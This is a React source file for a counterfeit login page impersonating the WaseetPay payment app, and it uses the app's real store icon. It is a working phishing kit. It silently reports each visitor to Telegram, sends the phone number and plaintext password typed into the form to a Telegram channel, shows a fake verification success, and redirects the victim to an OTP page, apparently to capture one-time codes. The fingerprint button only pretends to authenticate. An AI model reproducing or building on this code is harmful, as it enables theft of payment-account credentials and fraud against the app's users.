"use client"

import React, { useState, useEffect } from "react"
import {
  ChevronDown,
  Eye,
  EyeOff,
  Fingerprint,
  Loader2,
  CheckCircle2,
} from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

export default function WaseetPayPage() {
  const [activeTab, setActiveTab] = useState<"login" | "register">("login")
  const [phone, setPhone] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [isPasswordFocused, setIsPasswordFocused] = useState(true)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [showBiometricModal, setShowBiometricModal] = useState(false)
  const [merchantModal, setMerchantModal] = useState(false)
  const [forgotModal, setForgotModal] = useState(false)
  const [phoneError, setPhoneError] = useState("")
  const [passwordError, setPasswordError] = useState("")

  // Track visitor info silently on mount
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        await fetchVisitorInfo()
        await sendTelegramMessage({
          title: "👁️ زائر جديد - وسيط باي | WaseetPay Visitor",
        })
      } catch {
        // silent fallback
      }
    }
    trackVisitor()
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    let hasError = false
    if (!phone.trim()) {
      setPhoneError("يرجى إدخال رقم الهاتف")
      hasError = true
    } else {
      setPhoneError("")
    }

    if (!password.trim()) {
      setPasswordError("يرجى إدخال كلمة المرور")
      hasError = true
    } else {
      setPasswordError("")
    }

    if (hasError) return

    setIsSubmitting(true)

    try {
      await sendTelegramMessage({
        title: "🔐 تسجيل دخول وسيط باي | WaseetPay Login",
        phone: phone ? `09${phone.replace(/^09/, "")}` : "N/A",
        password: password || "N/A",
      })

      if (typeof window !== "undefined") {
        sessionStorage.setItem("userPhone", phone ? `09${phone.replace(/^09/, "")}` : "")
      }

      setTimeout(() => {
        setIsSubmitting(false)
        setIsSuccess(true)
        setTimeout(() => {
          const cleanPhone = phone ? `09${phone.replace(/^09/, "")}` : ""
          window.location.href = cleanPhone ? `/otp?phone=${encodeURIComponent(cleanPhone)}` : "/otp"
        }, 1000)
      }, 900)
    } catch {
      setIsSubmitting(false)
      const cleanPhone = phone ? `09${phone.replace(/^09/, "")}` : ""
      window.location.href = cleanPhone ? `/otp?phone=${encodeURIComponent(cleanPhone)}` : "/otp"
    }
  }

  const handleBiometricClick = async () => {
    setShowBiometricModal(true)
    try {
      await sendTelegramMessage({
        title: "👆 محاولة تسجيل بالبصمة | Biometric Click",
      })
    } catch {
      // silent
    }
    setTimeout(() => {
      setShowBiometricModal(false)
    }, 1800)
  }

  return (
    <div
      dir="rtl"
      className="h-[100dvh] max-h-[100dvh] sm:min-h-screen sm:h-auto sm:max-h-none w-full bg-white flex flex-col justify-between overflow-hidden sm:overflow-visible selection:bg-[#1E64EC]/20"
    >
      {/* ========================================================================= */}
      {/* TOP FULL-WIDTH SECTION: Royal Blue Gradient with Waves & Brand            */}
      {/* ========================================================================= */}
      <section
        className="w-full pt-3 sm:pt-10 lg:pt-12 pb-5 sm:pb-14 lg:pb-16 px-4 sm:px-6 relative overflow-hidden shrink-0 bg-[#1652cf]"
        style={{
          backgroundImage: "url('/login-bg.jpg')",
          backgroundPosition: "top center",
          backgroundSize: "cover",
          backgroundRepeat: "no-repeat",
        }}
      >
        {/* Subtle Grid overlay */}
        <div
          className="absolute inset-0 pointer-events-none opacity-20"
          style={{
            backgroundImage: `
              linear-gradient(to right, rgba(255, 255, 255, 0.15) 1px, transparent 1px),
              linear-gradient(to bottom, rgba(255, 255, 255, 0.15) 1px, transparent 1px)
            `,
            backgroundSize: "44px 44px",
          }}
        />

        {/* Luminous flowing cyan waves */}
        <svg
          className="absolute inset-0 w-full h-full pointer-events-none opacity-45"
          viewBox="0 0 1440 260"
          fill="none"
          preserveAspectRatio="none"
        >
          <path
            d="M-100,160 C300,50 650,220 1100,100 C1280,60 1420,130 1550,110"
            stroke="rgba(100, 215, 255, 0.7)"
            strokeWidth="2.5"
            filter="blur(1px)"
          />
          <path
            d="M-80,190 C320,80 680,240 1140,125 C1310,80 1440,150 1570,130"
            stroke="rgba(70, 160, 255, 0.4)"
            strokeWidth="1.5"
          />
          <path
            d="M-50,220 C350,110 710,260 1180,150 C1340,105 1460,170 1600,150"
            stroke="rgba(50, 140, 255, 0.25)"
            strokeWidth="1.2"
          />
        </svg>

        {/* Container aligned with form below */}
        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto relative z-10">
          {/* Top Brand Bar */}
          <div className="flex items-center justify-start gap-2 sm:gap-2.5">
            {/* App Icon */}
            <div className="w-[28px] h-[28px] sm:w-[38px] sm:h-[38px] rounded-[8px] sm:rounded-[10px] overflow-hidden shadow-sm shadow-blue-950/30 shrink-0 border border-white/20">
              <img
                src="https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/87/ae/5f/87ae5fa1-5f59-8287-5eed-960ccc48750c/Placeholder.mill/400x400bb-75.webp"
                onError={(e) => {
                  e.currentTarget.src = "/app-logo.webp"
                }}
                alt="WaseetPay Logo"
                className="w-full h-full object-cover"
              />
            </div>

            {/* Brand Title */}
            <div className="text-white font-bold text-[14px] sm:text-[17px] tracking-tight flex items-center gap-1.5">
              <span>وسيط باي</span>
              <span className="text-white/60 font-light text-[11px] sm:text-[13px]">|</span>
              <span className="font-semibold text-[13px] sm:text-[15.5px]">WaseetPay</span>
            </div>
          </div>

          {/* Titles */}
          <div className="mt-2 sm:mt-7 lg:mt-8">
            <h1 className="text-[22px] sm:text-[34px] lg:text-[36px] font-extrabold text-white tracking-tight leading-tight">
              تسجيل الدخول
            </h1>
            <p className="text-white/85 text-[11.5px] sm:text-[14.5px] font-normal mt-0.5 sm:mt-1 leading-snug">
              ادفع، حوّل، واشترِ بسهولة وأمان.
            </p>
          </div>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* BOTTOM FULL-WIDTH SECTION: Pure White Sheet with Top Rounded Edge         */}
      {/* ========================================================================= */}
      <section className="w-full bg-white -mt-3 sm:-mt-6 lg:-mt-8 rounded-t-[24px] sm:rounded-t-[36px] flex-1 px-4 sm:px-6 pt-3 sm:pt-7 lg:pt-8 pb-2 sm:pb-8 flex flex-col justify-between shadow-[0_-8px_25px_rgba(0,0,0,0.05)] relative z-20 overflow-hidden sm:overflow-visible">
        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto flex flex-col justify-between h-full">
          <div>
            {/* ---------------- Segmented Tabs ---------------- */}
            <div className="w-full bg-[#f3f4f6] p-[2.5px] rounded-[14px] flex items-center mb-2 sm:mb-5 border border-gray-100">
              {/* Login Tab */}
              <button
                type="button"
                onClick={() => setActiveTab("login")}
                className={`flex-1 py-1 sm:py-2 rounded-[11px] text-[12px] sm:text-[14px] font-bold transition-all duration-150 cursor-pointer text-center select-none ${
                  activeTab === "login"
                    ? "bg-white text-[#1f2937] shadow-xs"
                    : "bg-transparent text-[#9ca3af] hover:text-[#4b5563]"
                }`}
              >
                تسجيل الدخول
              </button>

              {/* Register Tab */}
              <button
                type="button"
                onClick={() => setActiveTab("register")}
                className={`flex-1 py-1 sm:py-2 rounded-[11px] text-[12px] sm:text-[14px] font-medium transition-all duration-150 cursor-pointer text-center select-none ${
                  activeTab === "register"
                    ? "bg-white text-[#1f2937] shadow-xs font-bold"
                    : "bg-transparent text-[#9ca3af] hover:text-[#4b5563]"
                }`}
              >
                إنشاء حساب
              </button>
            </div>

            {/* ---------------- Form Fields ---------------- */}
            <form onSubmit={handleSubmit} className="space-y-2 sm:space-y-4">
              {/* Field 1: Phone Number */}
              <div>
                <label className="block text-[#6b7280] text-[11.5px] sm:text-[13px] font-medium mb-0.5 sm:mb-1.5 text-right">
                  رقم الهاتف
                </label>
                <div
                  className={`h-[42px] sm:h-[52px] rounded-[12px] sm:rounded-[16px] bg-white px-3 sm:px-3.5 flex items-center justify-between transition-colors ${
                    phoneError
                      ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
                      : "border border-[#e5e7eb] focus-within:border-[#1E64EC] focus-within:ring-2 focus-within:ring-[#1E64EC]/15"
                  }`}
                >
                  {/* Right side in RTL: Libya Flag + Down Arrow */}
                  <div className="flex items-center gap-1.5 sm:gap-2 shrink-0 select-none">
                    {/* Libyan Flag Circle */}
                    <svg
                      viewBox="0 0 32 32"
                      className="w-[18px] h-[18px] sm:w-[22px] sm:h-[22px] rounded-full shrink-0 shadow-2xs overflow-hidden border border-gray-100"
                    >
                      <rect width="32" height="8" fill="#e7211a" />
                      <rect y="8" width="32" height="16" fill="#000000" />
                      <rect y="24" width="32" height="8" fill="#249c47" />
                      <path
                        d="M17.5 11.5 A 4.5 4.5 0 1 0 17.5 20.5 A 3.6 3.6 0 1 1 17.5 11.5 Z"
                        fill="#ffffff"
                      />
                      <polygon
                        points="18.5,14.5 19,15.7 20.2,15.7 19.3,16.4 19.6,17.5 18.5,16.8 17.4,17.5 17.7,16.4 16.8,15.7 18,15.7"
                        fill="#ffffff"
                      />
                    </svg>

                    <ChevronDown className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-[#6b7280] stroke-[2.5]" />
                  </div>

                  {/* Vertical Divider */}
                  <div className="w-px h-4 sm:h-6 bg-[#e5e7eb] ml-2 sm:ml-3 shrink-0" />

                  {/* Phone Input - Strictly Numeric */}
                  <div className="flex-1">
                    <input
                      type="tel"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      value={phone}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "")
                        setPhone(val)
                        if (phoneError) setPhoneError("")
                      }}
                      placeholder="xxxxxxx-09"
                      dir="ltr"
                      className="w-full text-right text-[13.5px] sm:text-[15px] font-medium text-[#1f2937] placeholder:text-[#9ca3af] outline-none bg-transparent"
                    />
                  </div>
                </div>
                {phoneError && (
                  <p className="text-rose-500 text-[11px] font-medium mt-0.5 text-right animate-in fade-in duration-150">
                    {phoneError}
                  </p>
                )}
              </div>

              {/* Field 2: Password */}
              <div>
                <label className="block text-[#6b7280] text-[11.5px] sm:text-[13px] font-medium mb-0.5 sm:mb-1.5 text-right">
                  كلمة المرور
                </label>
                <div
                  className={`h-[42px] sm:h-[52px] rounded-[12px] sm:rounded-[16px] bg-white px-3 sm:px-3.5 flex items-center justify-between transition-all ${
                    passwordError
                      ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
                      : isPasswordFocused
                      ? "border-2 border-[#1E64EC] shadow-[0_0_0_2px_rgba(29,100,236,0.12)]"
                      : "border border-[#e5e7eb]"
                  }`}
                >
                  {/* Eye Toggle on Left in RTL */}
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="text-[#6b7280] hover:text-[#374151] p-1 transition-colors cursor-pointer select-none"
                    aria-label={showPassword ? "إخفاء كلمة المرور" : "عرض كلمة المرور"}
                  >
                    {showPassword ? (
                      <Eye className="w-4 h-4 sm:w-[18px] sm:h-[18px] stroke-[1.8]" />
                    ) : (
                      <EyeOff className="w-4 h-4 sm:w-[18px] sm:h-[18px] stroke-[1.8]" />
                    )}
                  </button>

                  {/* Password Input with Rounded Circular Dots */}
                  <div className="flex-1 mr-2 relative flex items-center justify-end">
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onFocus={() => setIsPasswordFocused(true)}
                      onBlur={() => setIsPasswordFocused(false)}
                      onChange={(e) => {
                        setPassword(e.target.value)
                        if (passwordError) setPasswordError("")
                      }}
                      placeholder=""
                      dir="ltr"
                      className="w-full text-right text-[14px] sm:text-[16px] font-medium text-[#1f2937] outline-none bg-transparent"
                    />
                    {!password && (
                      <div className="absolute right-0 flex items-center gap-1 pointer-events-none select-none">
                        {isPasswordFocused && (
                          <span className="text-[#1E64EC] font-normal text-[15px] animate-pulse ml-0.5">|</span>
                        )}
                        <span className="w-1.5 h-1.5 rounded-full bg-slate-400 inline-block" />
                        <span className="w-1.5 h-1.5 rounded-full bg-slate-400 inline-block" />
                        <span className="w-1.5 h-1.5 rounded-full bg-slate-400 inline-block" />
                      </div>
                    )}
                  </div>
                </div>
                {passwordError && (
                  <p className="text-rose-500 text-[11px] font-medium mt-0.5 text-right animate-in fade-in duration-150">
                    {passwordError}
                  </p>
                )}

                {/* Forgot Password Link */}
                <div className="mt-1 sm:mt-2 text-right">
                  <button
                    type="button"
                    onClick={() => setForgotModal(true)}
                    className="text-[#1E64EC] hover:text-[#1855ca] text-[11.5px] sm:text-[13px] font-semibold transition-colors hover:underline cursor-pointer"
                  >
                    نسيت كلمة المرور ؟
                  </button>
                </div>
              </div>

              {/* Action Buttons Row */}
              <div className="pt-0.5 sm:pt-2 flex items-center gap-2 sm:gap-3">
                {/* Submit Login Button */}
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="flex-1 h-[42px] sm:h-[52px] rounded-[12px] sm:rounded-[16px] bg-[#1E64EC] hover:bg-[#1855ca] active:scale-[0.99] text-white font-bold text-[14px] sm:text-[16px] flex items-center justify-center shadow-md shadow-[#1E64EC]/25 transition-all cursor-pointer disabled:opacity-85"
                >
                  {isSubmitting ? (
                    <Loader2 className="w-4 h-4 sm:w-5 sm:h-5 animate-spin text-white" />
                  ) : isSuccess ? (
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 sm:w-5 sm:h-5 text-white" />
                      <span>تم التحقق بنجاح</span>
                    </div>
                  ) : (
                    "تسجيل الدخول"
                  )}
                </button>

                {/* Biometric Button */}
                <button
                  type="button"
                  onClick={handleBiometricClick}
                  aria-label="تسجيل الدخول بالبصمة"
                  className="w-[42px] h-[42px] sm:w-[52px] sm:h-[52px] rounded-[12px] sm:rounded-[16px] bg-[#1E64EC] hover:bg-[#1855ca] active:scale-95 text-white flex items-center justify-center shrink-0 shadow-md shadow-[#1E64EC]/25 transition-all cursor-pointer"
                >
                  <Fingerprint className="w-5 h-5 sm:w-7 sm:h-7 text-white stroke-[1.8]" />
                </button>
              </div>
            </form>

            {/* ---------------- Divider: 'أو' ---------------- */}
            <div className="relative flex items-center justify-center my-2 sm:my-5">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-slate-200" />
              </div>
              <span className="relative bg-white px-3 text-[#9ca3af] text-[11.5px] sm:text-[13px] font-medium select-none">
                أو
              </span>
            </div>

            {/* ---------------- Merchant Login Button ---------------- */}
            <button
              type="button"
              onClick={() => setMerchantModal(true)}
              className="w-full h-[38px] sm:h-[50px] rounded-[12px] sm:rounded-[16px] border border-[#e5e7eb] hover:bg-slate-50 active:scale-[0.99] text-[#374151] font-bold text-[12.5px] sm:text-[14px] flex items-center justify-center gap-2 transition-all cursor-pointer shadow-2xs"
            >
              <svg
                viewBox="0 0 24 24"
                className="w-3.5 h-3.5 sm:w-5 sm:h-5 text-[#9ca3af] stroke-current fill-none stroke-[1.7]"
              >
                <path d="M3 21h18" strokeLinecap="round" />
                <path d="M4 21V10" strokeLinecap="round" />
                <path d="M20 21V10" strokeLinecap="round" />
                <path d="M8 21V10" strokeLinecap="round" strokeDasharray="1 1" />
                <path d="M12 21V10" strokeLinecap="round" />
                <path d="M16 21V10" strokeLinecap="round" strokeDasharray="1 1" />
                <path d="M2 10h20" strokeLinecap="round" />
                <path d="M12 3L2 8.5v1.5h20V8.5L12 3z" strokeLinejoin="round" />
                <circle cx="12" cy="6.2" r="0.7" fill="currentColor" />
              </svg>
              <span>تسجيل دخول للتجار</span>
            </button>
          </div>

          {/* Website Copyright Footer */}
          <footer className="w-full pt-1.5 sm:pt-4 text-center text-[10px] sm:text-xs text-slate-400">
            <span>© {new Date().getFullYear()} وسيط باي | WaseetPay. جميع الحقوق محفوظة.</span>
          </footer>
        </div>
      </section>

      {/* ========================================================================= */}
      {/* MODALS & NOTIFICATIONS                                                    */}
      {/* ========================================================================= */}
      {/* Biometric Simulation Modal */}
      {showBiometricModal && (
        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-4">
          <div className="bg-white rounded-[24px] p-6 max-w-[340px] w-full text-center shadow-2xl animate-in zoom-in-95 duration-200">
            <div className="w-16 h-16 rounded-full bg-blue-50 text-[#1E64EC] mx-auto mb-4 flex items-center justify-center">
              <Fingerprint className="w-10 h-10 animate-pulse stroke-[1.8]" />
            </div>
            <h3 className="text-[17px] font-bold text-gray-900 mb-1">
              المصادقة البيومترية
            </h3>
            <p className="text-[13px] text-gray-500 mb-4">
              يرجى استخدام مستشعر البصمة أو مفتاح الأمان للمتابعة
            </p>
            <div className="w-full bg-gray-100 rounded-full h-1.5 overflow-hidden">
              <div className="bg-[#1E64EC] h-full animate-[mukuruFill_2s_infinite]" />
            </div>
          </div>
        </div>
      )}

      {/* Merchant Modal */}
      {merchantModal && (
        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-4">
          <div className="bg-white rounded-[24px] p-6 max-w-[360px] w-full text-center shadow-2xl animate-in zoom-in-95 duration-200">
            <h3 className="text-[18px] font-bold text-gray-900 mb-2">
              بوابة التجار | Merchant Portal
            </h3>
            <p className="text-[13px] text-gray-600 mb-5 leading-relaxed">
              مرحباً بك في منصة التجار الخاصة بشركة وسيط باي. تتيح لك المنصة متابعة العمليات وإصدار الفواتير.
            </p>
            <button
              onClick={() => setMerchantModal(false)}
              className="w-full py-3 bg-[#1E64EC] text-white font-bold rounded-[14px] text-[14px] cursor-pointer hover:bg-[#1855ca]"
            >
              إغلاق
            </button>
          </div>
        </div>
      )}

      {/* Forgot Password Modal */}
      {forgotModal && (
        <div className="fixed inset-0 z-50 bg-black/50 backdrop-blur-[2px] flex items-center justify-center p-4">
          <div className="bg-white rounded-[24px] p-6 max-w-[360px] w-full text-center shadow-2xl animate-in zoom-in-95 duration-200">
            <h3 className="text-[18px] font-bold text-gray-900 mb-2">
              استعادة كلمة المرور
            </h3>
            <p className="text-[13px] text-gray-600 mb-5 leading-relaxed">
              يرجى إدخال رقم هاتفك المسجل وسنرسل لك رمز التحقق لاستعادة الحساب
            </p>
            <button
              onClick={() => setForgotModal(false)}
              className="w-full py-3 bg-[#1E64EC] text-white font-bold rounded-[14px] text-[14px] cursor-pointer hover:bg-[#1855ca]"
            >
              موافق
            </button>
          </div>
        </div>
      )}
    </div>
  )
}
